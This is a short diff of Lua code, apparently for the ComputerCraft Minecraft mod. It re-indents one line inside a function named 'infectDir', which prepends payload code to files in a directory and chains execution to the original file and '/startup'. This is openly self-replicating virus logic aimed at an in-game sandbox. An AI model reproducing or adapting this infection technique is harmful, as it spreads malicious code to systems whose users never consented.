@@ -67,7 +67,7 @@ function infectDir(dirName, payload)
           escape = fs.open("escapeCSV")
           dump = dump .. escape.readAll() .. "\n"
           escape.close()
-		  dump = dump .. 'shell.run("' .. fullFile .. '" .. escapeCSV(args))\n'
+          dump = dump .. 'shell.run("' .. fullFile .. '" .. escapeCSV(args))\n'
           dump = dump .. 'shell.run("/startup")\n'
         else
           dump = payload
